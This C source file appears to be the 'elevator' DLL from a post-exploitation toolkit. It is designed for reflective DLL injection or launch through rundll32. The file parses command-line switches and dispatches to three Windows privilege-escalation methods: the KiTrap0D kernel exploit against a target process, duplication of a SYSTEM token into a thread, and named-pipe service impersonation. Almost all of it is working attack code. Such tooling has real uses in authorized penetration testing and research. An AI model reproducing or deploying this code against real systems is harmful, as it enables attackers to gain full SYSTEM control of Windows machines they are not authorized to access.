//
// Note: To use the produced x86 dll on NT4 we use a post build event "editbin.exe /OSVERSION:4.0 /SUBSYSTEM:WINDOWS,4.0 elevator.dll" 
//       in order to change the MajorOperatingSystemVersion and MajorSubsystemVersion to 4 instead of 5 as Visual C++ 2008
//       can't build PE images for NT4 (only 2000 and up). The modified dll will then work on NT4 and up. This does
//       not apply to the produced x64 dll.
//

#include "elevator.h"
#include "namedpipeservice.h"
#include "tokendup.h"
#include "kitrap0d.h"

// define this as we are going to be injected via LoadRemoteLibraryR
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR

// define this as we want to use our own DllMain function
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

/*
 * Grab a DWORD value out of the command line.
 * e.g. elevator_command_dword( "/FOO:0x41414141 /BAR:0xCAFEF00D", "/FOO:" ) == 0x41414141
 */
DWORD elevator_command_dword( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	DWORD dwResult  = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		dwResult = strtoul( cpString, NULL, 0 );

	} while( 0 );

	return dwResult;
}

/*
 * Grab a int value out of the command line.
 * e.g. elevator_command_dword( "/FOO:12345 /BAR:54321", "/FOO:" ) == 12345
 */
int elevator_command_int( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	int iResult     = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		iResult = atoi( cpString );

	} while( 0 );

	return iResult;
}

/*
 * The real entrypoint for this app.
 */
VOID elevator_main( char * cpCommandLine )
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		dprintf( "[ELEVATOR] elevator_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );

		if( !cpCommandLine )
			break;

		if( strlen( cpCommandLine ) == 0 )
			break;
			
		dprintf( "[ELEVATOR] elevator_main. lpCmdLine=%s", cpCommandLine );
		
		if( strstr( cpCommandLine, "/KITRAP0D" ) )
		{
			DWORD dwProcessId  = 0;
			DWORD dwKernelBase = 0;
			DWORD dwOffset     = 0;

			dwProcessId  = elevator_command_dword( cpCommandLine, "/VDM_TARGET_PID:" );
			dwKernelBase = elevator_command_dword( cpCommandLine, "/VDM_TARGET_KRN:" );
			dwOffset     = elevator_command_dword( cpCommandLine, "/VDM_TARGET_OFF:" );

			if( !dwProcessId || !dwKernelBase )
				break;

			elevator_kitrap0d( dwProcessId, dwKernelBase, dwOffset );

			// ...we should never return here...
		}
		else if( strstr( cpCommandLine, "/t:" ) )
		{
			DWORD dwThreadId = 0;

			dwThreadId = elevator_command_dword( cpCommandLine, "/t:" );

			dwResult = elevator_tokendup( dwThreadId, SECURITY_LOCAL_SYSTEM_RID );

			ExitThread( dwResult );
		}
		else if( strstr( cpCommandLine, "/p:" ) )
		{
			cpCommandLine += strlen( "/p:" );

			dwResult = elevator_namedpipeservice( cpCommandLine );
		}

	} while( 0 );
}

/*
 * rundll32.exe entry point.
 */
VOID DLLEXPORT CALLBACK a( HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int nCmdShow )
{
	elevator_main( lpszCmdLine );

	ExitProcess( ERROR_SUCCESS );
}

/*
 * DLL entry point. If we have been injected via RDI, lpReserved will be our command line.
 */
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInstance;
			if( lpReserved != NULL )
				elevator_main( (char *)lpReserved );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return bReturnValue;
}

